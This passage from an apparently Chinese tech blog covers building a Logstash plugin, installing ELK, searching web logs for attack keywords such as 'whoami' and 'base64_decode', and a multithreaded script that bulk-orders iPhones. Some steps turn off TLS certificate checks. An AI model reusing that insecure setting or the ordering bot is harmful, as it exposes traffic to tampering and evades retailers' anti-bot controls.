numerizer 0.1.1 #······若干Fetching Installing Fetching logstash-core 5.5.1.snapshot1 (java) Installing logstash-core 5.5.1.snapshot1 (java) jar dependencies for logstash-core-5.5.1.snapshot1-java.gemspec . . . org.apache.logging.log4j:log4j-api:2.6.2:compile org.apache.logging.log4j:log4j-core:2.6.2:compile com.fasterxml.jackson.core:jackson-core:2.7.4:compile com.fasterxml.jackson.core:jackson-databind:2.7.4:compile com.fasterxml.jackson.module:jackson-module-afterburner:2.7.4:compile com.fasterxml.jackson.dataformat:jackson-dataformat-cbor:2.7.4:compile Fetching logstash-core-plugin-api 2.1.27 (java) Installing logstash-core-plugin-api 2.1.27 (java) #······若干Fetching Installing Fetching logstash-devutils 1.3.6 (java) Installing logstash-devutils 1.3.6 (java) Using logstash-filter-test 3.0.1 from source at `.` Bundle complete! 2 Gemfile dependencies, 53 gems now installed. Use `bundle info [gemname]` to see where a bundled gem is installed. Post-install message from jar-dependencies: if you want to use the executable lock_jars then install ruby-maven gem before using lock_jars $ gem install ruby-maven -v '~&gt; 3.3.11' or add it as a development dependency to your Gemfile gem 'ruby-maven', '~&gt; 3.3.11'&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; # done [bundle install] 运行tests:&gt; bundle exec rspec --- jar coordinate com.fasterxml.jackson.core:jackson-databind already loaded with version 2.7.4 - omit version 2.9.1 --- jar coordinate com.fasterxml.jackson.core:jackson-annotations already loaded with version 2.7.0 - omit version 2.9.1 --- jar coordinate com.fasterxml.jackson.module:jackson-module-afterburner already loaded with version 2.7.4 - omit version 2.9.1 --- jar coordinate com.fasterxml.jackson.core:jackson-core already loaded with version 2.7.4 - omit version 2.9.1 ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console. Sending Logstash&apos;s logs to which is now configured via log4j2.properties Run options: exclude &#123;:redis=&gt;true, :socket=&gt;true, :performance=&gt;true, :couchdb=&gt;true, :elasticsearch=&gt;true, :elasticsearch_secure=&gt;true, :export_cypher=&gt;true, :integration=&gt;true, :windows=&gt;true&#125; Randomized with seed 42629 . Finished in 0.25881 seconds (files took 19.52 seconds to load) 1 example, 0 failures Randomized with seed 42629 7. 构建/测试拥有了所有必需的组件，继续运行build命令：&gt; gem build logstash-filter-test.gemspec WARNING: license value 'Apache License (2.0)' is invalid. Use a license identifier from http://spdx.org/licenses or 'Nonstandard' for a nonstandard license. Did you mean 'Apache-2.0'? WARNING: open-ended dependency on logstash-devutils (&gt;= 0, development) is not recommended if logstash-devutils is semantically versioned, use: add_development_dependency 'logstash-devutils', '~&gt; 0' WARNING: See http://guides.rubygems.org/specification-reference/ for help Successfully built RubyGem Name: logstash-filter-test Version: 3.0.1 File: logstash-filter-test-3.0.1.gem # gemspec文件中的s.version数字将提供gem版本，在本例中为3.0.1。 7. 安装测试 安装logstash 直接从官方下载了zip包，解压到/Applications/logstash目录。 cd /Applications/logstash./bin/logstash -V # logstash 5.6.4 使用plugin工具安装刚才生成的gem 使用命令： logstash-plugin install xxx.gem [坑0x01] 无法连接 rubygems.org bin/logstash-plugin install /Users/jason/TempDocs/logstash-filter-test/logstash-filter-test-3.0.1.gem Validating /Users/jason/TempDocs/logstash-filter-test/logstash-filter-test-3.0.1.gem Installing logstash-filter-test WARNING: can not set Session#timeout=(0) no session context Error Gem::RemoteFetcher::FetchError, retrying 1/10 too many connection resets (https://rubygems.org/gems/aws-sdk-core-2.3.22.gem) [解决处理] 替换官方镜像 https://gems.ruby-china.org 修改~/.gemrc文件，增加ssl_verify_mode: 0配置 sudo gem update --system 升级RubyGems 版本 替换gem sources - gem sources --add命令 gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ https://gems.ruby-china.org/ added to sources https://rubygems.org/ removed from sourcesgem sources -l *** CURRENT SOURCES *** https://gems.ruby-china.org/ 替换gem sources - 修改../logstash/Gemfile文件 #source "https://rubygems.org"source "https://gems.ruby-china.org" 安装： bin/logstash-plugin install /Users/jason/TempDocs/logstash-filter-test/logstash-filter-test-3.0.1.gem Validating /Users/jason/TempDocs/logstash-filter-test/logstash-filter-test-3.0.1.gem Installing logstash-filter-test Installation successful # 安装成功bin/logstash-plugin list | grep test logstash-filter-test # plugin列表中可查 实际测试 使用命令行传入的简单配置运行Logstash，使用test插件。 -e "input &#123; stdin&#123;&#125; &#125; filter &#123; test &#123;&#125; &#125; output &#123;stdout &#123; codec ![](logstash自定义插件开发/image01.png)传入message参数：```bin/logstash -e &quot;input &#123; stdin&#123;&#125; &#125; filter &#123; test &#123;message =&gt; &apos;changing the message parameter by Mr.Bingo ^_^&apos;&#125; &#125; output &#123;stdout &#123; codec =&gt; rubydebug &#125;&#125;&quot; 后面终于，完成了自定义插件的示例开发与使用。官方文档上还有开源方法，鉴于目前的菜逼水平，完全也没必要看。也许有一天想开源个插件，到时候再来看吧！ 接下来，着手WEB攻击日志分析的插件开发。也许从modsecurity取规则是个不错的选择。 How to write a Logstash filter plugin 手把手教你编写Logstash插件]]></content>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK安装及使用入门]]></title>
    <url>%2F2017%2FELK%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[ELK的声名早有耳闻，日志分析领域不可忽视的解决方案，是时候实际搞一搞了。 Elasticsearch：负责日志存储、检索和分析 LogStash：负责日志的收集、处理 Kibana：负责日志的可视化 当前环境：Ubuntu16.04LTS Logstash1. 安装JDK虽然JRE也能用，但我偏偏还是喜欢JDK。 主机上以前已经安装过JAVA，检查一下版本。bingo@U:/elk$ java -versionopenjdk version "1.8.0_131"OpenJDK Runtime Environment (build 1.8.0_131-8u131-b11-2ubuntu1.16.04.3-b11)OpenJDK 64-Bit Server VM (build 25.131-b11, mixed mode) 2. 安装logStashLogstash是一个接收，处理，转发日志的工具，通过在配置文件中添加或者修改inputs、outputs、filters，就可以使随意的格式化日志数据成为可能，从而订制更合理的存储格式为查询提供便利。 从官网下载安装包 https://www.elastic.co/downloads/logstash，官方提供了很多种安装方式，yum/apt/rpm/deb/zip等等，当前最新稳定版本为 5.6.4 bingo@U:/elk$ sudo dpkg -i ./logstash-5.6.4.debSelecting previously unselected package logstash.(Reading database ... 250151 files and directories currently installed.)Preparing to unpack .../Downloads/logstash-5.6.4.deb ...Unpacking logstash (1:5.6.4-1) ...Setting up logstash (1:5.6.4-1) ...Using provided startup.options file: /etc/logstash/startup.optionsSuccessfully created system startup script for Logstash# 配置logstash的环境变量touch /etc/profile.d/logstash.shecho "export PATH=\$PATH:/usr/share/logstash/bin" &gt; /etc/profile.d/logstash.sh. /etc/profile logstash路径：/usr/share/logstash/ 3. logstash配置官方文档 : https://www.elastic.co/guide/en/logstash/current/configuration-file-structure.html logstash代理是一个具有3个阶段的处理流水线：输入→过滤器→输出。 输入生成事件，过滤器修改它们，输出将其发送到别的地方。 配置文件结构：# 配置文件中可以使用 # 号作为注释符input &#123; ...&#125;filter &#123; ...&#125;output &#123; ...&#125; 每个部分都包含一个或多个插件的配置选项。 如果指定了多个过滤器，则会按照他们的配置文件中的显示顺序应用它们。 插件配置 插件配置由插件名及其随后的配置块构成：input &#123; # 第一个插件 file &#123; path =&gt; "/var/log/messages" type =&gt; "syslog" &#125; # 第二个插件 file &#123; path =&gt; "/var/log/apache/access.log" type =&gt; "apache" &#125;&#125; 如上插件中的配置项为：path和type。 不同的插件所能配置的配置项是有所不同的。 配置sample# 从控制台输入后不作处理直接输出。input &#123;stdin&#123;&#125;&#125; output &#123;stdout&#123;&#125;&#125; # 从控制台输入后，格式化输出。input &#123;stdin&#123;&#125;&#125; output&#123;stdout&#123;codec =&gt; rubydebug&#125;&#125;# 根据某客户IIS7.5日志数据定制的，不清楚是否与默认的格式匹配input &#123; file &#123; type =&gt; "IISLog" path =&gt; ["/media/psf/Home/TempDocs/iisLog/sample.log"] start_position =&gt; beginning #监听文件的起始位置，默认是end &#125; #stdin&#123;&#125;&#125;filter &#123; ## Ignore the comments that IIS will add to the start of the W3C logs # if [message] =~ "^#" &#123; drop &#123;&#125; &#125; # check that fields match your IIS log settings # grok是logstash中把非标准化的日志数据转换成标准化并且可搜索数据最好的方式。 # [Logstash Grok filter](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html) # [grok debuger](http://grokdebug.herokuapp.com) grok &#123; match =&gt; ["message", "%&#123;TIMESTAMP_ISO8601:log_timestamp&#125; %&#123;IPORHOST:iisSite&#125; %&#123;WORD:method&#125; %&#123;URIPATHPARAM:request&#125; %&#123;NOTSPACE:query&#125; %&#123;NUMBER:port&#125; %&#123;NOTSPACE:username&#125; %&#123;IPORHOST:clienthost&#125; %&#123;NOTSPACE:useragent&#125; %&#123;NUMBER:scstatus&#125; %&#123;NUMBER:substatus&#125; %&#123;NUMBER:win32status&#125; %&#123;NUMBER:timetaken&#125;"]&#125; # set the event timestamp from the log 取log中记录的时间作为elasticSearch中的索引时间 # https://www.elastic.co/guide/en/logstash/current/plugins-filters-date.html date &#123; match =&gt; [ "log_timestamp", "YYYY-MM-dd HH:mm:ss" ] timezone =&gt; "Etc/UCT" &#125; # matches the big, long nasty useragent string to the actual browser name, version, etc # https://www.elastic.co/guide/en/logstash/current/plugins-filters-useragent.html useragent &#123; source=&gt; "useragent" prefix=&gt; "browser_" &#125; mutate &#123; remove_field =&gt; [ "log_timestamp"] &#125;&#125;# output logs to console and to elasticsearchoutput &#123; #stdout &#123; codec =&gt; rubydebug &#125; #elasticsearch插件配置：https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#plugins-outputs-elasticsearch-index # http://blog.csdn.net/yesicatt/article/details/53393814 elasticsearch &#123; hosts =&gt; ["localhost:9200"] # 默认值 index =&gt; ["logstash-%&#123;+YYYY.MM.dd&#125;"] # 默认值 id =&gt; "my_plugin_id" &#125;&#125; 4. 通过-e参数启动，适合于快速测试使用。root@U:~# logstash -e "input &#123;stdin&#123;&#125;&#125; output &#123;stdout&#123;&#125;&#125;"WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaultsCould not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the consoleThe stdin plugin is now waiting for input:hello logstash # stdin2017-11-09T01:15:25.393Z U hello logstash # stdout root@U:~# logstash -e &quot;input &#123;stdin&#123;&#125;&#125; output&#123;stdout&#123;codec =&gt; rubydebug&#125;&#125;&quot;WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaultsCould not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the consoleThe stdin plugin is now waiting for input:Helloooooooooooo Bingoooooo&#123; &quot;@version&quot; =&gt; &quot;1&quot;, &quot;host&quot; =&gt; &quot;U&quot;, &quot;@timestamp&quot; =&gt; 2017-11-09T01:18:52.487Z, &quot;message&quot; =&gt; &quot;Helloooooooooooo Bingoooooo&quot;&#125; 5. 通过-f参数启动，以配置文件方式启动。bingo@U:/usr/share/logstash$ sudo ./bin/logstash -f /etc/logstash/test.conf --config.reload.automatic[sudo] password for bingo: WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaultsCould not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console&#123; "request" =&gt; "/default.aspx", "useragent" =&gt; "Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/46.0.2490.86+Safari/537.36", "browser_os_name" =&gt; "Windows", "type" =&gt; "IISLog", "clienthost" =&gt; "192.168.101.171", "path" =&gt; "/media/psf/Home/TempDocs/iisLog/sample.log", "browser_patch" =&gt; "2490", "timetaken" =&gt; "1201", "browser_major" =&gt; "46", "@version" =&gt; "1", "host" =&gt; "U", "win32status" =&gt; "0", "browser_os" =&gt; "Windows", "method" =&gt; "GET", "substatus" =&gt; "0", "query" =&gt; "InfoID=74283&amp;SettingModuleID=1147&amp;tabid=0p://www1.customs.gov.cn/Default.aspx?TabID=433", "browser_minor" =&gt; "0", "message" =&gt; "2017-09-25 23:35:04 192.168.101.178 GET /default.aspx InfoID=74283&amp;SettingModuleID=1147&amp;tabid=0p://www1.customs.gov.cn/Default.aspx?TabID=433 80 - 192.168.101.171 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/46.0.2490.86+Safari/537.36 200 0 0 1201", "iisSite" =&gt; "192.168.101.178", "browser_name" =&gt; "Chrome", "@timestamp" =&gt; 2017-09-25T23:35:04.000Z, "browser_build" =&gt; "", "port" =&gt; "80", "browser_device" =&gt; "Other", "username" =&gt; "-", "scstatus" =&gt; "200"&#125; Elasticsearch1. 安装elasticSearch下载地址：https://www.elastic.co/downloads/elasticsearchbingo@U:/usr/share/logstash$ sudo dpkg -i /media/psf/Home/Downloads/elasticsearch-5.6.4.deb# Elasticsearch路径 : /usr/share/elasticsearch/ 2. 运行elasticSearch 采坑0x01：OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x000000008a660000, 1973026816, 0) failed; error=&#39;Cannot allocate memory&#39; (errno=12) 由于elasticsearch默认分配jvm空间大小为2g，修改jvm空间分配 root@U:/usr/share/elasticsearch# vim /etc/elasticsearch/jvm.options# ***************************************************# Xms represents the initial size of total heap space# Xmx represents the maximum size of total heap space-Xms512m # 默认是Xms2g-Xmx512m # 默认是Xms2g 采坑0x02: root@U:/usr/share/elasticsearch# ./bin/elasticsearchException in thread "main" org.elasticsearch.bootstrap.BootstrapException: java.nio.file.NoSuchFileException: /usr/share/elasticsearch/configLikely root cause: java.nio.file.NoSuchFileException: /usr/share/elasticsearch/config****** 在目录下添加config目录 bingo@U:/usr/share/elasticsearch$ bin/elasticsearch2017-11-09 19:07:39,608 main ERROR Could not register mbeans java.security.AccessControlException: access denied ("javax.management.MBeanTrustPermission" "register")******ERROR: no log4j2.properties found; tried [/usr/share/elasticsearch/config] and its subdirectories 正解： bingo@U:/usr/share/elasticsearch$ sudo service elasticsearch start 运行验证： bingo@U:/usr/share/elasticsearch$ curl http://0.0.0.0:9200&#123;"name" : "y7WTVkf","cluster_name" : "elasticsearch","cluster_uuid" : "AiASw__aRNqyEA2IUJqVOg","version" : &#123; "number" : "5.6.4", "build_hash" : "8bbedf5", "build_date" : "2017-10-31T18:55:38.105Z", "build_snapshot" : false, "lucene_version" : "6.6.1"&#125;,"tagline" : "You Know, for Search"&#125; 3. 安装使用elasticsearch-head官方地址： https://github.com/mobz/elasticsearch-head bingo@U:/usr/share$ git clone git://github.com/mobz/elasticsearch-head.gitbingo@U:/usr/share/elasticsearch-head$ sudo apt install npmbingo@U:/usr/share/elasticsearch-head$ npm installbingo@U:/usr/share/elasticsearch-head$ npm run start 访问： http://localhost:9100/ Kibana1. 安装Kibana下载地址： https://www.elastic.co/downloads/kibanabingo@U:/usr/share/elasticsearch$ sudo dpkg -i /media/psf/Home/Downloads/kibana-5.6.4-amd64.deb# 目录 ： /usr/share/kibana 2. 运行Kibanabingo@U:/usr/share/kibana$ sudo vim /etc/kibana/kibana.yml*********************# The URL of the Elasticsearch instance to use for all your queries.elasticsearch.url: "http://localhost:9200"*********************bingo@U:/usr/share/kibana$ sudo bin/kibana[sudo] password for bingo: log [11:59:11.223] [info][status][plugin:kibana@5.6.4] Status changed from uninitialized to green - Ready log [11:59:11.339] [info][status][plugin:elasticsearch@5.6.4] Status changed from uninitialized to yellow - Waiting for Elasticsearch log [11:59:11.386] [info][status][plugin:console@5.6.4] Status changed from uninitialized to green - Ready log [11:59:11.437] [info][status][plugin:metrics@5.6.4] Status changed from uninitialized to green - Ready log [11:59:11.807] [info][status][plugin:timelion@5.6.4] Status changed from uninitialized to green - Ready log [11:59:11.842] [info][listening] Server running at http://localhost:5601 log [11:59:11.850] [info][status][ui settings] Status changed from uninitialized to yellow - Elasticsearch plugin is yellow log [11:59:16.888] [info][status][plugin:elasticsearch@5.6.4] Status changed from yellow to yellow - No existing Kibana index found log [11:59:18.560] [info][status][plugin:elasticsearch@5.6.4] Status changed from yellow to green - Kibana index ready log [11:59:18.564] [info][status][ui settings] Status changed from yellow to green - Ready...... 直接访问： http://localhost:5601 3. 使用Kibana主要使用lucene查询语法：https://www.elastic.co/guide/en/elasticsearch/reference/5.6/query-dsl-query-string-query.html#query-string-syntax 比如：查询eval关键字 直接在elasticsearch中查询：http://localhost:9200/logstash-2017.09.24/_search?pretty=true&amp;q=eval 在kibana中查询： 结语如此，ELK算是初步运行起来了。 实用的运用姿势待进一步挖掘。 比如： geoip IP分析插件 attackfilter 攻击分析插件 kabana中可视化 ….]]></content>
      <tags>
        <tag>日志分析</tag>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB日志分析思路与方法]]></title>
    <url>%2F2017%2FWEB%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文很杂乱，主要是为了简单记录一下。网上有一篇好文：Web日志安全分析浅谈 从WEB日志数据中，我们也许可以挖掘分析出很多好玩的东西，但在有百度统计之类的产品后，这样的功能再通过日志来实现是很鸡肋的。 然而，站在安全层面上来看，分析WEB日志，可以判断黑客的攻击是否成功？ 攻击路径？ 突破方式？ 损失情况鉴定等。 作为一个安全从业者，也手工分析过一些web日志。在分析的方式/手段/姿势上还需要总结提炼，故进行一下学习记录。 常规办法人工”手撕”日志，效率和效果也许都并不好，但好歹也算是一种方法吧。这种方法处理十来个GB的日志(非压缩)还是勉强能应付的。比较传统geek的办法是使用 awk / grep / sort / join 等Unix/Linux工具。这样的方式我不推荐，一来我自己用得不是很溜，二来现在各种文本编辑器的功能非常强大，比如本人目前使用的Visual Studio Code。其它的sublime Text, Notepad++（win）等 直接将数据载入文本编辑器。 搜索”base64_decode”,”evil”,”python-urllib”,”system”,”whoami”,”ipconfig”,”select”,”script”等关键字，定位疑似攻击的日志项。 找出相应的IP地址或(和)user-agent(有些服务器架构问题，导致无法记录原始IP地址,如负载均衡)，将所有的这些日志找出来。 参考时间线，查看URL信息,服务器响应代码，逐一判断是否攻击成功。比如：是否有成功的webshell调用，SQL注入等等。 进阶办法 ELK (Elasticsearch + Logstash + Kinaba) Elasticsearch 开源分布式搜索引擎 Logstash 对日志进行收集、过滤并存储到Elasticsearch或其他数据库 Kibana 对日志分析友好的Web界面,可对Elasticsearch中的数据进行汇总、分析、查询 ELK (Elasticsearch + Logstash + Kinaba) 基于WAF/正则规则 将日志数据导入数据库 建立攻击规则表(可考虑从modsecurity等WAF中提取) 写SQL语句进行统计 FreeBuf-多线程WEB安全日志分析脚本 我的日志分析之道：简单的Web日志分析脚本 干货好文 Web日志安全分析浅谈 海量日志分析 工具 spark等大数据相关工具 方法 数据预处理 数据挖掘算法(统计、分类、聚类、关联等多重方法) 模式 基于特征的检测 基于特征，是一种立竿见影的手段，对于一般的攻击很有效，但是永远不可能做到百分百，并且实效性极强，需要强大的响应队伍，对新漏洞尽可能快地做成特征库。 鉴于行为的检测 基于行为，是一种较为复杂的方式，是通过数学统计的方式来寻找异常，通过模式学习来寻找异常，但缺点是准确度不确定，可以做到很高，但误报率也很高。 参考资料使用Flume+Kafka+SparkStreaming进行实时日志分析 机器学习方法啥都不懂，扯犊子，占坑！！！]]></content>
      <tags>
        <tag>日志分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iPhoneX抢购Python脚本]]></title>
    <url>%2F2017%2FiPhoneX%E6%8A%A2%E8%B4%ADPython%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[叨逼叨原本以为iPhone X会被疯抢，所谓八仙过海各显神通，我就想着用自己的野路子看看凑效不？ 经过几天的流程梳理，代码编写及优化，在27号前夕以iPhone 8作为测试，效果是灰常的好！ 批量下单(iphone8/8p),跑了40个订单,每个订单一条线程，20秒左右全部订单成功，邮箱也瞬间收到几十封邮件： 失落的转折27日早上开始，苹果官网下单功能维护，直到下午三点功能才正常。 不过，在购物车跳转到支付页面的相关参数被改动了。所以，gg了！ 记录总结一下 | 付出总会有收获几天过去了，今天回过头来稍微整理下，记录下来，好歹也付出过不是？ 今天再次查看苹果网站，之前修改的参数点现在又修改回去了。不过在最后的下订单环节应该有增加了一些防护，所以我的脚本还是不能用。 python可以直接读取json文件转换为dict.非常好用！ 用datetime库来判断时间点： tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp()if tmp&gt;0: # UTC时间！ print(orderIdentify+"🤕\tiphone X 尚未起售！ == %d minutes =="%(tmp/60)) return 使用requests.session类来处理多步骤的请求，可以自动处理cookie问题，自动重试功能也非常赞！ session=requests.session() # session会话可以自动保存和处理cookiesession.proxies=proxiessession.verify=Falsesession.timeout=30 # 此处设置timeout无用session.headers=&#123;'User-Agent':userAgent&#125;# https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1)) # 实际会重试 max_retries +1 次 所以将retry次数先减1session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1)) 也许直接使用浏览器模拟器是更好的选择（如mechanize selenium），虽然“重”了些，但简单易处理。 上代码 | 感兴趣的拿走不谢#!/usr/bin/env python3# -*- coding: utf-8 -*-# Author : Mr.Bingo# Version : 2.0# Description : import pdbimport requestsimport loggingimport jsonimport sysimport osimport reimport threadingimport datetime,timefrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)logging.basicConfig(level=logging.INFO)#orderPath= os.path.join(os.path.split(os.path.abspath(__file__))[0],u'order') # json文件格式订单orderFile= os.path.join(os.path.split(os.path.abspath(__file__))[0],'order.txt') # txt订单格式# lastName | firstName | phone | email | state | city | district | street | payment | product | color | capacity | quantity# 邓 | 六 | 15000555000 | test3@oddboy.cn | 北京 | 北京 | 海淀区 | XXX路17号 | Alipay | iphone8 | glod | 256gb | 2orderResult = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Result.csv') # 成功订单# orderSuccess = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Success.txt') # 成功订单# orderFail = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Fail.txt') # 失败订单class iPhoneBuyer(object): # 初始化 def __init__(self): self.dispData=[] # list self.threadLock = threading.Lock() # 进程锁，主要用于写文件！ pass # 多线程情况下美化，格式化输出消息。 def display(self): pass # 开启多线程 一个订单一个线程 def run_Threads(self): thread_arr=[] # 线程列表 threading.Thread(target=self.display) # json文件格式订单读取 # logging.info("\r[info] Order Path : %s "%orderPath[:80]) # for dirpath,dirname,files in os.walk(orderPath): # print(files) # for f in files: # if re.match(r'^order.*\.json$',f): # f=os.path.join(orderPath,f) # logging.info(f) # with open(f,encoding='utf-8') as fp: # order=json.load(fp) # order['fileFullName']= f # logging.debug(order) # print("\n&gt; order's phone :: "+order['phone']) # #pdb.set_trace() # t=threading.Thread(target=self.buy,args=(order,)) # thread_arr.append(t) if not os.path.exists(orderFile): print("没有订单文件！！！") sys.exit(0) with open(orderFile,encoding='utf-8') as fp: raw_orders = fp.readlines() tmp = False for raw_order in raw_orders: if not tmp: tmp =True continue # 跳过order.txt文件的第一行 raw_order = str(raw_order).replace(' ','') # 删除所有空格 logging.debug(raw_order) if not re.match(r'^((.*?\|)&#123;13&#125;)',raw_order): # 简单检查订单格式 continue l = raw_order.split("|") order=&#123;&#125; order['lastName'] = l[0] order['firstName'] = l[1] order['phone'] = l[2] order['email'] = l[3] order['state'] = l[4] order['city'] = l[5] order['district'] = l[6] order['street'] = l[7] order['payment'] = l[8] order['product'] = l[9] order['color'] = l[10] order['capacity'] = l[11] order['quantity'] = l[12] logging.debug(order) t=threading.Thread(target=self.buy,args=(order,)) thread_arr.append(t) for t in range(len(thread_arr)): thread_arr[t].start() # 启动线程。 for t in range(len(thread_arr)): thread_arr[t].join() # 收拢 pass # 处理购买 def buy(self,order): retryTime = 5 # 请求失败后重试次数 retryTimeout = 30 # 全局超时时间 orderIdentify = order['lastName']+order['firstName']+"&lt;"+order['product']+"/"+ order['color']+"/"+order['capacity']+"&gt; || " # n = 0 # 测试代码 # while n &lt; 5: # print(threading.current_thread().name) # n = n + 1 # time.sleep(1) # return userAgent="Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)" # aywysya可能需要与此值匹配。 cookies=&#123;&#125; proxies=&#123; "http": "http://127.0.0.1:8080", # 本地监听 "https": "https://127.0.0.1:8080" &#125; print('order :: '+order['lastName']+order['firstName']+"\t"+order['email']+"\t%15s\t%15s\t%15s"%(order['product'],order['capacity'],order['color']) ) time.sleep(0.5) if order['product']=="iphone8" or order['product']=='iphone8plus': url="https://www.apple.com/cn/shop/buy-iphone/iphone-8" elif order['product']=='iphonex': #if datetime.datetime.now().timestamp() &lt; datetime.datetime(2017,10,27,15,0).timestamp(): #从时间判断是否起售 tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp() if tmp&gt;0: # UTC时间！ print(orderIdentify+"🤕\tiphone X 尚未起售！ == %d minutes =="%(tmp/60)) return else: url="https://www.apple.com/cn/shop/buy-iphone/iphone-x" session=requests.session() # session会话可以自动保存和处理cookie session.proxies=proxies session.verify=False session.timeout=30 # 此处设置timeout无用 session.headers=&#123;'User-Agent':userAgent&#125; # https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/ session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1)) # 实际会重试 max_retries +1 次 所以将retry次数先减1 session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1)) # logging.debug("GET请求 :: %s"%url) #r = session.get(url,timeout=reqTimeout) # logging.info("获得cookie :: %s"%print(r.cookies)[:80]) # 在products.json中遍历对应产品,PS:从网页获取比较麻烦。 if not os.path.exists(os.path.join(os.path.split(os.path.abspath(__file__))[0],"products.json")): print("\n\t\tproducts.json文件不存在！\n") sys.exit(0) currentProduct=&#123;&#125; with open(os.path.join(os.path.split(os.path.abspath(__file__))[0],"products.json"),encoding='utf-8') as productFileHandle: products = json.load(productFileHandle) for p in products: #pdb.set_trace() if p['productLocatorFamily']==order['product'] and p['dimensionCapacity']==order['capacity'] and p['dimensionColor']==order['color']: logging.debug("产品型号 : %s\t%s"%(p['partNumber'],p['seoUrlToken'])[:80]) currentProduct=p break # 找到相应产品，退出for循环 if len(currentProduct) == 0: print("未找到相应产品\t%s\t%s\t%s"%(order['product'],order['capacity'],order['color']) ) return # close products.json try: #if True: # 验证是否启售 while True: # 重试方式，但太复杂，且用修饰器也并不好实现。 # n = 0 # while n&lt;retryTime: # try: # r=session.get("https://www.apple.com/cn/shop/delivery-message?parts.0="+currentProduct['partNumber'],timeout=reqTimeout) # n = n + 10000 # 请求成功，跳出循环 # except Exception as e: # n = n + 1 # if n&gt;=retryTime: # print("重试次数过多！！！ &lt;退出&gt;") # return # end while order['remark']='出师未捷 :: '+"https://www.apple.com/cn/shop/delivery-message?parts.0="+currentProduct['partNumber'] logging.debug("\n%s\n"%currentProduct) r=session.get("https://www.apple.com/cn/shop/delivery-message?parts.0="+currentProduct['partNumber'],timeout=retryTimeout) logging.debug(r.text) deliveryMsg = json.loads(r.text,encoding='utf-8') #print(orderIdentify+"%s %s"%(deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy'],deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'])) if '未发售' in deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0] : print(orderIdentify+currentProduct['seoUrlToken']+" || 暂未发售") time.sleep(3) # 隔三秒钟 else: print(orderIdentify+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy']+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0]) break # 起售！！！ 跳出while死循环 # 添加购物车 addCartUrl=url+"/"+currentProduct['seoUrlToken']+"?product="+currentProduct['partNumber'] \ +"&amp;purchaseOption=fullPrice" \ +"&amp;step=select" \ +"&amp;dimensionCapacity="+currentProduct['dimensionCapacity'] \ +"&amp;dimensionColor="+currentProduct['dimensionColor'] \ +"&amp;part="+currentProduct['part'] \ +"&amp;complete=true" \ +"&amp;dimensionScreensize="+currentProduct['dimensionScreensize'] \ +"&amp;add-to-cart=add-to-cart" print(orderIdentify+"添加到购物车[GET] :: %s"%addCartUrl[:80]) r = session.get(addCartUrl,timeout=retryTimeout) #pdb.set_trace() # 访问购物车 shopBagUrl="https://www.apple.com/cn/shop/bag" print(orderIdentify+"访问购物车[GET] :: %s"%shopBagUrl[:80]) order['remark']="[失败]访问购物车 :: %s"%shopBagUrl r = session.get(shopBagUrl,timeout=retryTimeout) token=re.search(r'\"x-aos-stk\":\"(.*?)\"',r.text).group(1) # requests.utils.add_dict_to_cookiejar(session.cookies,&#123;"x-aos-stk":token&#125;) # 此语句是将token添加到cookie. # 修改数量 可修改为2 此处cookie中需要携带x-aos-stk，应该类似于token的作用。 # 应该可以省略！！！！！ 在结账步骤可一同实现。 # 